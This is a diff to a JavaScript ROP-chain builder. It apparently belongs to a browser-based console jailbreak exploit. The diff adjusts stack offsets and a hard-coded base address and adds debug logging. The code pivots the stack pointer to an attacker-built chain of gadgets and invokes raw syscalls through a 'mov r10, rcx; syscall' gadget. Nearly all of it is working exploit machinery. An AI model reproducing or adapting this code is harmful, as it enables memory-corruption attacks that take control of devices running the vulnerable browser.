@@ -34,7 +34,7 @@ var checking = false;
 function rop() {
 	setBase(stack_base + return_va);
 	var resp = getU64from(stack_base + return_va);
-	this.data = stack_base + return_va + 0x420;
+	this.data = stack_base + return_va + 0x600;
 	var chainAddress = stack_base - 0x20000;
 	var chainLength = 0;
 	var variableAddresses = [];
@@ -56,7 +56,7 @@ function rop() {
 		return chainLength;
 	}
 	
-	this.add("pop rbp", stack_base + return_va + 0x1400);
+	this.add("pop rbp", stack_base + return_va + 0x1300);
 	
 	this.add32 = function() {
 		var i;
@@ -97,11 +97,11 @@ function rop() {
 	this.start = function(address) {
 		logAdd("Starting code");
 		
-		setBase(0x91a300000);
+		setBase(0x913600000);
 		u32[0x3FFFE] = gadgets["mov r10, rcx; syscall"].address() % 0x100000000;
 		u32[0x3FFFF] = gadgets["mov r10, rcx; syscall"].address() / 0x100000000;
 		
-		this.add("pop rbp", stack_base + return_va - (chainLength + 8) + 0x1480);
+		this.add("pop rbp", stack_base + return_va - (chainLength + 8) + 0x1300);
 		//this.add("pop rcx", "mov r10, rcx; syscall");
 		this.add(address);
 	}
@@ -146,16 +146,19 @@ function rop() {
 	
 	this.execute = function(afterExecution) {
 		// Restore Stack Pointer
+		logAdd("execute enetered");
 		this.add("pop rax", resp);
 		this.write_rax(stack_base + return_va);
 		this.add("pop rsp", stack_base + return_va);
 		
 		this.resolveVariables();
 		
+		logAdd("resolve ran");
 		// Redirect Stack Pointer to our ROP chain
 		setU64into(stack_base + return_va, gadgets["pop rsp"].address());
 		setU64into(stack_base + return_va + 8, chainAddress);
-		
+				logAdd("after redirect");
+
 		setTimeout(function() {
 			if(afterExecution) afterExecution();
 		}, 1);
